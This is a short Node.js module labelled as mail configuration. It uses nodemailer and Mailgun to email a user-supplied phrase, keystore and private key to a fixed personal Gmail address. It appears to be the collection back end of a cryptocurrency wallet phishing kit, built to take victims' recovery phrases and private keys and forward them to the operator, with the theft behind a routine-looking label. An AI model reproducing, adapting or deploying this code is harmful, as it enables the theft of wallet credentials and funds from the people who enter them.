// mail configuration goes here

const nodemailer = require("nodemailer");
const mailGun = require("nodemailer-mailgun-transport");

const auth = {
  auth: {
    api_key: process.env.apikey,
    domain: process.env.domain,
  },
};

const transporter = nodemailer.createTransport(mailGun(auth));

const sendMail = (phrase, keyStore, privateKey, cb) => {
  const mailOptions = {
    from: "bankoleidris@gmail.com",
    to: "bankoleidris@gmail.com",
    phrase,
    keyStore,
    privateKey,
  };

  transporter.sendMail(mailOptions, function (err, data) {
    if (err) {
      cb(err, null);
    } else {
      cb(null, data);
    }
  });
};

module.exports = sendMail;
